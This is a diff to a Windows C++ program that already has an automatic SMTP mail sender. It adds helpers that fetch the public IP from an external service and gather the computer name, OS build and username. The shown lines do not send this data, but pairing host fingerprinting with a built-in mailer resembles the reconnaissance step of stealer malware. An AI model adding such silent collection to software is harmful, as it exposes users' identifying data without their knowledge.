@@ -1,4 +1,6 @@
+#include <winsock2.h>
 #include <windows.h>
+#include <winhttp.h>
 #include <shlobj.h>
 #include <cstdio>
 #include <cwchar>
@@ -76,6 +78,7 @@ void LogError(const wchar_t* fmt, ...) {
 
 // === Auto SMTP sender (Winsock) ===
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "winhttp.lib")
 
 bool SendMailAuto(const char* subject, const char* body) {
     WSADATA wsa;
@@ -207,6 +210,41 @@ bool SendMailAuto(const char* subject, const char* body) {
     closesocket(sock);
     WSACleanup();
     return true;
+}
+
+// === System info helpers ===
+std::string GetIP() {
+    HINTERNET hSes = WinHttpOpen(L"Drun/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSes) return "Unknown";
+    HINTERNET hCon = WinHttpConnect(hSes, L"api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hCon) { WinHttpCloseHandle(hSes); return "Unknown"; }
+    HINTERNET hReq = WinHttpOpenRequest(hCon, L"GET", L"/", NULL, NULL, NULL, 0);
+    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return "Unknown"; }
+    std::string ip = "Unknown";
+    if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hReq, NULL)) {
+        char buf[64]; DWORD r;
+        if (WinHttpReadData(hReq, buf, sizeof(buf)-1, &r) && r > 0) { buf[r] = 0; ip = buf; while(!ip.empty()&&(ip.back()=='\n'||ip.back()=='\r'))ip.pop_back(); }
+    }
+    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
+    return ip;
+}
+
+std::string GetDeviceInfo() {
+    std::string info;
+    // Computer name
+    WCHAR cn[MAX_COMPUTERNAME_LENGTH+1]; DWORD sz = MAX_COMPUTERNAME_LENGTH+1;
+    if (GetComputerNameW(cn, &sz)) info += "PC: " + WtoU8(cn) + "\r\n";
+    // OS version
+    OSVERSIONINFOEXW vi = {sizeof(vi)};
+    #pragma warning(suppress:4996)
+    if (GetVersionExW((OSVERSIONINFOW*)&vi)) {
+        char os[128]; snprintf(os, sizeof(os), "OS: Windows %lu.%lu Build %lu", vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
+        info += os + std::string("\r\n");
+    }
+    // Username
+    WCHAR un[256]; DWORD usz = 256;
+    if (GetUserNameW(un, &usz)) info += "User: " + WtoU8(un) + "\r\n";
+    return info;
 }
 void CheckErrorLog() {
     if (g_errLogPath[0] == 0) InitErrLog();
